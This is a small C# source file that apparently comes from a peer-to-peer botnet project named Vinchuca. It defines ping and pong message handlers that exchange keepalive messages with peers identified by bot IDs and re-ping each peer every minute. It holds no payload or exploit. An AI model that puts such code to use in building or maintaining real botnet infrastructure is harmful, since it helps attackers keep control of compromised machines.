using System;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;
using Vinchuca.Workers;

namespace Vinchuca.Network.Protocol.Handlers
{
    public class PingMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public PingMessageHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var reply = new PongMessage();
            _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
        }
    }

    public class PongMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public PongMessageHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            ClientWorker.Instance.QueueOneTime(() =>
                _messageManager.Send(new PingMessage(), botMessage.Header.BotId), TimeSpan.FromMinutes(1));
        }
    }
}